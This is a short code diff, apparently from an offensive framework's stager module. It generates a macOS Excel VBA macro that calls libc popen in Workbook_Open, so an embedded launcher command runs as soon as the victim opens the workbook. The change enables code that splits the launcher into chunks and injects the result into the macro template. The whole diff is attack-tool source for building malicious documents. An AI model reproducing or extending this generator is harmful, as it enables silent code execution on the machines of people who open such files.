@@ -81,8 +81,8 @@ class Stager:
 
         else:
             launcher = launcher.replace("\"", "\"\"")
-            # for match in re.findall(r"'(.*?)'", launcher, re.DOTALL):
-            #     payload = formStr("cmd", match)
+            for match in re.findall(r"'(.*?)'", launcher, re.DOTALL):
+                payload = formStr("cmd", match)
 
             macro = """
 Option Explicit
@@ -95,13 +95,14 @@ Private Declare Function popen Lib "libc.dylib" (ByVal command As String, ByVal 
 
 Private Sub Workbook_Open()
     Dim cmd As String
+    %s
     #If VBA7 Then
     Dim result As LongPtr
     #Else
     Dim result As Long
     #End If
-    result = popen("%s", "r")
+    result = popen(cmd, "r")
 End Sub
-""" %(launcher)
+""" %(payload)
 
             return macro
